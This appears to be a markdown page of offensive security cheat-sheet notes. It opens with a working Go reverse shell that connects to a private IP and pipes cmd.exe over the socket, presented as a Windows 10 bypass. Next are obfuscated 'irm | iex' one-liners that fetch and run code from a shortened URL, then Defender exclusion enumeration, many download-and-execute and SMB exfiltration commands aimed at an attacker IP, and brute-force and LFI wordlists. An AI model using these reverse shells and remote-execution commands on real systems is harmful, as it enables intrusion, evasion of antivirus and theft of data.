---
# the default layout is 'page'
icon: fas fa-subway
order: 6
---

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#  🖥️ Windows 10 Bypass With GO 
Exploitation Video Example [here...](https://youtu.be/zM8EVJdErsc?si=uGHzpHG8HMlHIfjZ)
### nano pleasesubscribe.go
```elixir
package main
import ("os/exec"; "net"; "time")

func main() { 
        time.Sleep(2 * time.Second)
        c,_:= net.Dial("tcp", "192.168.x.x:443")
        cmd:= exec.Command("cmd")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run() 
}
```
### Compile it !
```elixir
GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 🔥 Fire Your Notepad.exe
```bash
# Daily Stuff
irm is.gd/Q2Katq | iex

# Open Stuff
Invoke-RestMethod is.gd/Q2Katq | Invoke-Expression

# Hide Stuff
& (gal ir?) is.gd/Q2Katq |& (gal i?x)
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 📸 ShutOFF your webcam
This Required Admin Powers...
```bash
# ShutOFF your webcam
Disable-PnpDevice -InstanceId (Get-PnpDevice -Class Camera -Status OK).InstanceId -Confirm:$false

# Fireup Your webcam
Enable-PnpDevice -InstanceId (Get-PnpDevice -Class Camera -Status Error).InstanceId -Confirm:$false   
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 🧶 Common Windows Thinks
```bash
[Directory Listing in Different Partitions] :-
dir C:\    or    dir D:\     or     dir E:\
dir C:\ -force
dir D:\ -force

[Defender Check] :-
(Get-Service windefend).Status
Get-MpComputerStatus
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
Get-MpComputerStatus | findstr /I "AntivirusEnabled RealTimeProtectionEnabled ComputerID AMEngineVersion AMProductVersion"

[Password Policiy]:-
net accounts
net accounts /domain

```



-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 💭  Defender Exclusion Path Detection
[John Hammand Video ](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
### Add Exclusion Path
```elixir
# Need Admin Priv
Search virus  ---> open it ---> click on Virus & Threat Protection ( Manage setting ) ----> Go at the End of the page ---> See the Exclusion ====> Now you can add or remove Paths.
```
## For ADMIN User
```elixir
(Get-MpPreference).ExclusionPath
```
## For Low Power User
```elixir
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
```
# 🐼 Get your Box IpAddress
## IPv4 Address
```elixir
Get-NetIPAddress -AddressFamily IPv4 |findstr /i ipaddress
```
## IPv6 Address
```elixir
Get-NetIPAddress -AddressFamily IPv6 |findstr /i ipaddress
powershell irm apip.cc/json
```
### Get Internet Facing IPAddress
```elixir
$pubIPv4 = Invoke-RestMethod -Uri "https://api.ipify.org"
$pubIPv6 = Invoke-RestMethod -Uri "https://api64.ipify.org"

Write-Output "Your Public IPv4 Address : $pubIPv4"
Write-Output "Your Public IPv6 Address : $pubIPv6"
```
### One linear
```elixir
"Your IPv4 is: $(irm api.ipify.org)"; "Your IPv6 is: $(irm api64.ipify.org)"    # irm= invoke Rest Method

powershell -->  "Your IPV6 Address is leaked.. $(irm apip.cc/json)"
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#  🗃️ File Transfer
```elixir
# 1. IEX DownloadString (Execute in memory)
IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")

# 2. curl (Windows 10+)
curl http://$ip:$port/file -o file

# 3. Invoke-WebRequest
powershell "iwr -Uri http://$ip:$port/file -OutFile C:\Windows\Temp\file"

# 4. NetExec (needs valid credentials)
nxc smb $ip -u '' -p '' --put-file file C:\Windows\Temp\file

# 5. PowerShell DownloadFile
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/file','C:\Temp\file')"

# 6. Short version (iwr + IEX)
IEX(iwr 'http://$ip:$port/file' -UseBasicParsing)

# 7. Certutil
certutil -urlcache -split -f http://$ip:$port/file file
certutil -urlcache * delete

# 8. wget (PowerShell alias)
wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"

# 9. smbserver
impacket-smbserver share ./ -smb2support -user 0xmr -pass ''
or 
smbserver.py share ./ -smb2support -user 0xmr -pass ''

##  Copy to windows
net use \\$Attacker_IP\share /user:0xmr
copy \\$Attacker_IP\share\file C:\Temp\file

##  copy from windows
net use \\$Attacker_IP\share /user:0xmr
copy file_name \\$Attacker_IP\share

# 10. Download and Execution Both
powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windows/Tasks/file; C:/Windows/Tasks/file"

powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 🛺 Some Python Automation...
```bash
# Used to Stable shell's
python3 -c "import pty; pty.spawn('/bin/bash')"

# Create Windows NTLM Password 
python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-16le')).digest().hex())"

# Common UTF-8 Formate
python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-8')).digest().hex())"   

# URL Encoding Think's
python3 -c "import urllib.parse; print(urllib.parse.quote('../'))"

# Encode Character's
python3 -c "from urllib.parse import quote; encode_username = quote('username_here'); print(encode_username)"   
```

# 📋 Wordlists
Resource [wordlists.assetnote.io](https://wordlists.assetnote.io/)

### Directory Brute Force Wordlists
```bash
# Core classics (high efficiency)
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt          # ← hidden gem  
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

# Modern / high-hit additions
 /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt               # API heavy targets
 /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.txt                   # or specific CMS
 /usr/share/wordlists/seclists/Discovery/Web-Content/trickest-cms-wordlist.txt           # auto-updated CMS gem

# Assetnote (recommended for 2026 – fresher than static lists)
# Download: https://wordlists.assetnote.io/
 httparchive_directories.txt
 httparchive_files.txt
```

### vHosts Brute Force Wordlists
```bash
/usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
/usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Hidden gems (very high efficiency)
 /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt                      # short but deadly for vhosts
 /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Assetnote (best for modern subdomains – monthly updated)
 commonspeak2_subdomains.txt   # or download the latest from wordlists.assetnote.io
```

### Parameter Brute Force Wordlists
```bash
# Must-Have #1 – Highest efficiency for most targets
/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Very strong complementary lists from SecLists
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt          # Great for API parameter names too

# Assetnote – Best modern/fresh list (highly recommended in 2026)
# Download latest from: https://wordlists.assetnote.io/
httparchive_parameters_top_1m_2026_02_27.txt     # ~376k real-world parameters (replace with newest monthly version)
```


### Username Brute Force Wordlists
```bash
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
/usr/share/wordlists/seclists/Usernames/Names/names.txt
/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt  or femalenames-usa-top1000.txt or forenames-india-top1000.txt or familynames-usa-top1000.txt

# Extra high-efficiency additions
 /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt
 /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt
```

### Password Brute Force Wordlists
```bash
 /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/top_shortlist.txt
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt

 /usr/share/wordlists/seclists/Passwords/Default-Credentials/
   # windows-betterdefaultpasslist.txt
   # ssh-betterdefaultpasslist.txt
   # tomcat-betterdefaultpasslist.txt
   # vnc-betterdefaultpasslist.txt
   # default-passwords.txt               # ← very useful

# Hidden gem
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```


### Best Email Names Brute Force Wordlists
```bash
/usr/share/seclists/Fuzzing/email-top-100-domains.txt    (google.com yahhoo.com microsoft.in)...
 /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
 /usr/share/wordlists/seclists/Usernames/Names/names.txt
 /usr/share/wordlists/seclists/Usernames/Names/forenames-india-top1000.txt
 /usr/share/wordlists/seclists/Usernames/Names/familynames-india.txt   # combine first + last


# bash -c 'while read name; do echo "${name,,}@target.com"; echo "${name// /.}@target.com"; done < Wordlist > emails.txt' 
# while read name; do echo "${name,,}@target.com"; echo "${name// /.}@target.com"; done <   Wordlist  > emails.txt
```


### LFI Filw Wordlists
```bash
# Absolute King for LFI – Highest hit rate
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Cleaner / lower noise variants
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-graceful.txt
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt

# Huge version (use only if you have time/bandwidth)
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt

# Interesting files to test after finding LFI (Linux + Windows)
/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt
/usr/share/wordlists/seclists/Fuzzing/LFI/common-sensitive-files.txt
```
